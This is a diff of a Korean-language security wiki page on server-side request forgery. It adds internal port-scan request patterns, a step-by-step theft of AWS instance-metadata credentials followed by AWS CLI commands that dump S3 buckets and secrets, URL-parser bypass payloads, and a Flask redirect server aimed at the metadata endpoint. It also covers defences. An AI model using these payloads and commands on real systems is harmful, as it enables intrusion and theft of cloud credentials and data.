@@ -1,7 +1,7 @@
 ---
 title: "SSRF (Server-Side Request Forgery)"
-tags: [security, cloud, kubernetes]
-updated: 2026-04-29
+tags: [security, cloud, aws, kubernetes]
+updated: 2026-09-22
 ---
 
 # SSRF (Server-Side Request Forgery)
@@ -51,16 +51,42 @@ sequenceDiagram
 
 ## 내부 네트워크 접근 시나리오
 
-### 내부 서비스 스캔
+### 내부망 포트 스캔
+
+SSRF가 있으면 내부 네트워크 지도를 그릴 수 있다. HTTP 응답 코드와 응답 시간 두 가지가 판별 기준이다.
 
 ```
-POST /api/webhook
-{
-  "url": "http://192.168.1.1:8080/health"
-}
+# 살아있는 호스트: 200 또는 그 밖의 응답 코드 → 수십~수백 ms
+POST /api/preview { "url": "http://10.0.0.1:80/" }
+
+# 닫힌 포트: 연결 거부(RST) → 보통 10ms 미만
+POST /api/preview { "url": "http://10.0.0.1:81/" }
+
+# 방화벽 차단: 타임아웃 → 수 초
+POST /api/preview { "url": "http://10.0.0.1:8443/" }
 ```
 
-응답 코드나 응답 시간 차이로 내부 네트워크에 어떤 서비스가 살아있는지 파악할 수 있다. 포트 스캔도 가능하다.
+실전에서는 두 단계로 진행한다. 먼저 `/24` 대역을 훑어 살아있는 호스트를 찾고, 발견된 호스트에서 공격 가치가 높은 포트를 집중 스캔한다.
+
+```
+# 공격 가치가 높은 포트 목록
+6379  → Redis (인증 없는 인스턴스가 많다)
+27017 → MongoDB
+9200  → Elasticsearch
+2375  → Docker daemon API (인증 없으면 컨테이너 생성 가능)
+8500  → Consul (서비스 레지스트리, 크리덴셜 저장소)
+8080  → Spring Boot Actuator (/env, /heapdump 엔드포인트)
+5601  → Kibana
+4040  → Spark UI
+9090  → Prometheus
+8161  → ActiveMQ 웹 콘솔
+5432  → PostgreSQL
+3306  → MySQL
+```
+
+응답 코드 자체도 정보다. 401/403은 서비스가 있고 인증이 필요하다는 뜻이고, 200이면 바로 접근된다는 뜻이다. 응답 바디가 서버 전체로 전달되는 구조라면 내부 API 응답을 그대로 읽을 수 있다.
+
+마이크로서비스 환경에서 내부 서비스끼리는 인증 없이 통신하는 경우가 많다. SSRF 한 번으로 내부 API를 그대로 호출할 수 있다.
 
 ### 내부 API 호출
 
@@ -98,15 +124,66 @@ gopher://127.0.0.1:6379/_SET%20pwned%20true%0D%0A
 
 AWS EC2 인스턴스는 `169.254.169.254`에서 메타데이터 서비스를 제공한다. IMDSv1은 단순 GET 요청으로 접근할 수 있어서, SSRF로 바로 털린다.
 
+공격 순서는 세 단계다.
+
+**1단계 — Role 이름 조회**
+
 ```
-# IAM Role 크레덴셜 탈취
 GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
-
-# Role 이름 확인 후 크레덴셜 획득
-GET http://169.254.169.254/latest/meta-data/iam/security-credentials/my-role-name
 ```
 
-응답에 `AccessKeyId`, `SecretAccessKey`, `Token`이 그대로 들어있다. 이걸로 S3, DynamoDB 등 AWS 리소스에 접근할 수 있다.
+응답은 텍스트 한 줄이다.
+
+```
+ec2-prod-role
+```
+
+**2단계 — 임시 크리덴셜 획득**
+
+```
+GET http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-prod-role
+```
+
+응답 JSON:
+
+```json
+{
+  "Code": "Success",
+  "LastUpdated": "2024-09-22T08:00:00Z",
+  "Type": "AWS-HMAC",
+  "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
+  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+  "Token": "AQoDYXdzEJr...(수백 바이트짜리 세션 토큰)",
+  "Expiration": "2024-09-22T14:00:00Z"
+}
+```
+
+임시 토큰은 기본 6시간 유효하다. `Expiration` 직전에 IMDS를 다시 호출하면 자동 갱신된다. 공격자 입장에서는 토큰을 빼간 뒤 6시간 안에 최대한 활용하거나, 갱신 주기를 맞춰 장기 접근을 유지한다.
+
+**3단계 — 탈취 크리덴셜로 AWS 리소스 접근**
+
+```bash
+export AWS_ACCESS_KEY_ID="ASIAIOSFODNN7EXAMPLE"
+export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+export AWS_SESSION_TOKEN="AQoDYXdzEJr..."
+
+# 이 Role이 어떤 권한을 가졌는지 확인
+aws sts get-caller-identity
+aws iam list-attached-role-policies --role-name ec2-prod-role
+
+# S3 버킷 목록 및 파일 다운로드
+aws s3 ls
+aws s3 cp s3://company-prod-configs/ . --recursive
+
+# Secrets Manager에 저장된 DB 패스워드, API 키 수집
+aws secretsmanager list-secrets
+aws secretsmanager get-secret-value --secret-id /prod/db/master-password
+
+# 다른 리전의 리소스도 접근 가능
+aws s3 ls --region ap-northeast-2
+```
+
+Capital One 사고(2019)에서 이 경로로 1억 건 이상의 고객 데이터가 빠져나갔다. EC2에 붙은 IAM Role이 S3 버킷에 과도한 읽기 권한을 가지고 있었다. SSRF 한 번으로 버킷 전체를 dump할 수 있었다.
 
 ### GCP
 
@@ -154,32 +231,80 @@ http://spoofed.burpcollaborator.net   # 공격자가 DNS를 제어하는 도메�
 http://your-domain.com                # A 레코드를 127.0.0.1로 설정
 ```
 
-### URL 파서 혼동
+### @ 문자를 이용한 파서 혼동
 
-```
-# @ 앞은 userinfo로 해석
-http://allowed.com@evil.com
+URL 구조는 `scheme://[userinfo@]host[:port]/path`다. `@` 앞이 userinfo(사용자명:패스워드), `@` 뒤가 실제 접속 대상 host다.
 
-# fragment나 쿼리로 파서 혼동
-http://allowed.com#@127.0.0.1
-http://127.0.0.1\t.allowed.com    # 일부 파서에서 탭 무시
-
-# URL 인코딩
-http://127.0.0.%31
-```
-
-### 리다이렉트 이용
-
-allowlist에 있는 외부 URL이 내부 주소로 리다이렉트하게 만든다.
+Python `urllib.parse`, JavaScript `new URL()`, Java `new URI()` 모두 `http://evil.com@127.0.0.1`을 파싱하면 host를 `127.0.0.1`로 반환한다. `evil.com`은 userinfo 필드로 들어간다.
 
 ```python
-# 공격자 서버
-@app.route('/redirect')
-def redirect():
-    return redirect('http://169.254.169.254/latest/meta-data/', code=302)
+from urllib.parse import urlparse
+
+r = urlparse("http://evil.com@127.0.0.1/path")
+print(r.hostname)   # 127.0.0.1
+print(r.username)   # evil.com
 ```
 
-서버가 리다이렉트를 자동으로 따라가면, 최종 목적지는 메타데이터 서비스다.
+이 사실 자체가 취약점은 아니다. 문제는 검증 코드가 URL 파서를 쓰지 않고 문자열 포함 여부를 체크할 때 생긴다.
+
+```python
+# 취약한 방어 — 문자열 contains 체크
+def is_allowed(url: str) -> bool:
+    return "api.trusted.com" in url
+
+# 공격 페이로드:
+# http://api.trusted.com@169.254.169.254/latest/meta-data/
+# → is_allowed() 가 True를 반환하지만
+#   실제 HTTP 요청 대상은 169.254.169.254
+```
+
+반대 방향도 있다. 일부 레거시 파서나 커스텀 파서가 `@` 앞을 host로 취급하는 경우다.
+
+```
+http://127.0.0.1@trusted.com
+# 정상 파서: host=trusted.com (allowlist 통과, 요청도 trusted.com으로 감)
+# 버그 있는 파서: host=127.0.0.1 (allowlist 통과, 요청은 127.0.0.1로 감)
+```
+
+이 불일치가 나타나는 상황은 검증 라이브러리와 HTTP 클라이언트 라이브러리가 각자 다른 URL 파싱 로직을 쓸 때다. 방어책은 하나다 — 검증에서 resolve한 IP로 직접 연결한다. 파서 불일치 자체를 공격 면에서 제거한다.
+
+```
+# 기타 파서 혼동 기법
+http://allowed.com#@127.0.0.1        # #(fragment) 뒤를 host로 착각하는 파서
+http://127.0.0.1\t.allowed.com       # 탭을 무시하는 파서
+http://127.0.0.%31                   # %31 = 1, % 인코딩 우회
+http://127.0.0.1%2f@allowed.com      # %2f = / 로 @ 위치 혼동
+```
+
+### 리다이렉트를 이용한 allowlist 우회
+
+allowlist에 포함된 외부 URL이 내부 주소로 302 리다이렉트를 던지게 만든다. 검증 시점에는 allowlist의 도메인에 요청하지만, 실제 요청이 도달하는 곳은 내부 서비스다.
+
+```python
+# 공격자 서버 (Flask)
+from flask import Flask, redirect
+
+app = Flask(__name__)
+
+@app.route('/hook')
+def malicious_redirect():
+    # 검증을 통과하는 도메인(attacker-domain.com)이 allowlist에 있다고 가정
+    # 요청이 들어오면 IMDS로 302를 던진다
+    return redirect('http://169.254.169.254/latest/meta-data/iam/security-credentials/', code=302)
+```
+
+피해 서버 입장에서 일어나는 일:
+
+1. 클라이언트가 `http://attacker-domain.com/hook`을 전달
+2. 검증 코드가 `attacker-domain.com`이 allowlist에 있다고 판단 → 통과
+3. HTTP 클라이언트가 `http://attacker-domain.com/hook`에 GET 요청
+4. 공격자 서버가 302 응답, `Location: http://169.254.169.254/...`
+5. HTTP 클라이언트가 리다이렉트를 자동 추적해 IMDS에 GET 요청
+6. IMDS가 IAM 크리덴셜 응답 → 클라이언트가 응답을 그대로 반환
+
+Python `requests`, Node.js `axios`, Java `RestTemplate` 모두 기본값이 리다이렉트 자동 추적이다. `allow_redirects=False` / `maxRedirects: 0` 을 명시해야 막힌다.
+
+Shopify Exchange 사고가 이 패턴이었다. 최초 URL만 allowlist 검증하고 리다이렉트 후 URL은 재검증하지 않아서 뚫렸다.
 
 ---
 
